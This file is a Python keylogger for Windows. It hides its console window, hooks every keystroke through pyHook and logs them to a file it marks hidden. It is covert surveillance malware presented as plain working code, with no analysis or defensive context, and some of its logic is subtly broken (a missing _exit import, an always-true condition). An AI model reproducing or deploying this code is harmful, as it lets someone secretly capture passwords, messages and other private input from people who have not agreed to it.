import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import os
import logging
from datetime import datetime

# Hide the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Set up logging to a file with proper formatting
log_file = 'C:\\output.txt'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Ensure the output file is hidden
if os.path.exists(log_file):
    # Change the file attribute to hidden
    os.system(f'attrib +h {log_file}')
else:
    with open(log_file, 'w') as f:
        f.write('')  # Create the file if it doesn't exist and hide it
    os.system(f'attrib +h {log_file}')

# Function to handle the keyboard events
def OnKeyboardEvent(event):
    try:
        if event.Ascii == 5:  # Exit if Ctrl+E is pressed
            _exit(1)
        elif event.Ascii == 13:  # Enter key
            logging.info('<ENTER>\n')
        elif event.Ascii == 8:  # Backspace key
            logging.info('<BACKSPACE>')
        elif event.Ascii == 9:  # Tab key
            logging.info('<TAB>')
        elif event.Ascii != 0 or 8:
            keylogs = chr(event.Ascii)
            logging.info(keylogs)
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

# Start capturing events
pythoncom.PumpMessages()
